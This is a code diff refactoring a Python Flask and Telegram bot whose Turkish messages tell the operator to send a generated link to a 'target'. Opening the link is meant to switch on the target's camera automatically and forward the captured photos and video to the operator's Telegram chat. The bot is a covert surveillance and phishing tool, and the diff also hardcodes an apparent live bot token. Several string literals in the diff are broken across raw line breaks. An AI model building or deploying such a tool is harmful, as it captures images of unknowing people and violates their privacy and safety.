@@ -4,8 +4,8 @@ import uuid
 import base64
 from io import BytesIO
 from flask import Flask, request, send_from_directory
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, Bot
-from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+import telegram
 
 # ==================== CONFIG ====================
 TOKEN = os.environ.get("BOT_TOKEN", "8845469880:AAEEENGVv_igk7_DzrgMdK2UGG9Dnzva8VY")
@@ -19,7 +19,7 @@ else:
 
 PORT = int(os.environ.get("PORT", 5000))
 
-# Kullanıcı verileri
+# Kullanici verileri
 user_tokens = {}
 
 # Logging
@@ -29,66 +29,62 @@ logger = logging.getLogger(__name__)
 # Flask app
 app = Flask(__name__, static_folder='static')
 
-# Telegram Bot Application
-bot_app = Application.builder().token(TOKEN).build()
-
-# ==================== HANDLERS ====================
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    username = update.effective_user.username or "Bilinmiyor"
-
-    token = str(uuid.uuid4()).replace("-", "")[:16]
-    user_tokens[token] = {
-        "user_id": user_id,
-        "username": username,
-        "chat_id": update.effective_chat.id
-    }
-
-    link = f"{WEBHOOK_URL}/c/{token}"
-
-    keyboard = [[InlineKeyboardButton("📸 Linke Git", url=link)]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-
-    await update.message.reply_text(
-        f"👋 Merhaba @{username}!
-
-"
-        f"📎 **Özel Linkiniz:**
-`{link}`
-
-"
-        f"🔗 Bu linki hedefe gönderin.
-"
-        f"📱 Hedef linke tıklayınca kamera otomatik açılır!
-"
-        f"📸 Fotoğraf çekilip size anında gönderilir.",
-        parse_mode="Markdown",
-        reply_markup=reply_markup
-    )
-
-bot_app.add_handler(CommandHandler("start", start))
+# Telegram Bot (sync)
+bot = telegram.Bot(token=TOKEN)
 
 # ==================== FLASK ROUTES ====================
 @app.route(f"/{TOKEN}", methods=["POST"])
 def telegram_webhook():
     json_data = request.get_json()
-    update = Update.de_json(json_data, bot_app.bot)
 
-    # asyncio event loop kullan
-    import asyncio
-    try:
-        loop = asyncio.get_event_loop()
-    except RuntimeError:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
+    # Mesaji isle
+    if "message" in json_data and "text" in json_data["message"]:
+        chat_id = json_data["message"]["chat"]["id"]
+        user_id = json_data["message"]["from"]["id"]
+        username = json_data["message"]["from"].get("username", "Bilinmiyor")
+        text = json_data["message"]["text"]
 
-    loop.run_until_complete(bot_app.process_update(update))
+        if text == "/start":
+            token = str(uuid.uuid4()).replace("-", "")[:16]
+            user_tokens[token] = {
+                "user_id": user_id,
+                "username": username,
+                "chat_id": chat_id
+            }
+
+            link = f"{WEBHOOK_URL}/c/{token}"
+
+            keyboard = [[InlineKeyboardButton("Linke Git", url=link)]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+
+            # Emoji YOK - f-string sorunu olmasin
+            message_text = (
+                "Merhaba @" + username + "!
+
+"
+                "Ozel Linkiniz:
+" + link + "
+
+"
+                "Bu linki hedefe gonderin.
+"
+                "Hedef linke tiklayinca kamera otomatik acilir!
+"
+                "Fotograf cekilip size aninda gonderilir."
+            )
+
+            bot.send_message(
+                chat_id=chat_id,
+                text=message_text,
+                reply_markup=reply_markup
+            )
+
     return "OK", 200
 
 @app.route("/c/<token>")
 def capture_page(token):
     if token not in user_tokens:
-        return "<h1>Link geçersiz!</h1>", 404
+        return "<h1>Link gecersiz!</h1>", 404
     return send_from_directory("static", "capture.html")
 
 @app.route("/upload/<token>", methods=["POST"])
@@ -111,25 +107,17 @@ def upload_photo(token):
     except:
         return {"error": "Invalid image"}, 400
 
-    import asyncio
-    try:
-        loop = asyncio.get_event_loop()
-    except RuntimeError:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
+    caption = "Yeni Fotograf!
 
-    async def send():
-        await bot_app.bot.send_photo(
-            chat_id=chat_id,
-            photo=BytesIO(image_bytes),
-            caption=f"📸 Yeni Fotoğraf!
+Kullanici: @" + username + "
+Token: " + token
 
-👤 Kullanıcı: @{username}
-🔗 Token: `{token}`",
-            parse_mode="Markdown"
-        )
+    bot.send_photo(
+        chat_id=chat_id,
+        photo=BytesIO(image_bytes),
+        caption=caption
+    )
 
-    loop.run_until_complete(send())
     return {"success": True}, 200
 
 @app.route("/upload_video/<token>", methods=["POST"])
@@ -145,29 +133,21 @@ def upload_video(token):
     chat_id = user_info["chat_id"]
     username = user_info["username"]
 
-    import asyncio
-    try:
-        loop = asyncio.get_event_loop()
-    except RuntimeError:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
+    caption = "Yeni Video!
 
-    async def send():
-        await bot_app.bot.send_video(
-            chat_id=chat_id,
-            video=video_file.read(),
-            caption=f"🎥 Yeni Video!
+Kullanici: @" + username
 
-👤 Kullanıcı: @{username}",
-            parse_mode="Markdown"
-        )
+    bot.send_video(
+        chat_id=chat_id,
+        video=video_file.read(),
+        caption=caption
+    )
 
-    loop.run_until_complete(send())
     return {"success": True}, 200
 
 @app.route("/")
 def home():
-    return "✅ Bot Aktif!"
+    return "Bot Aktif!"
 
 # ==================== MAIN ====================
 if __name__ == "__main__":
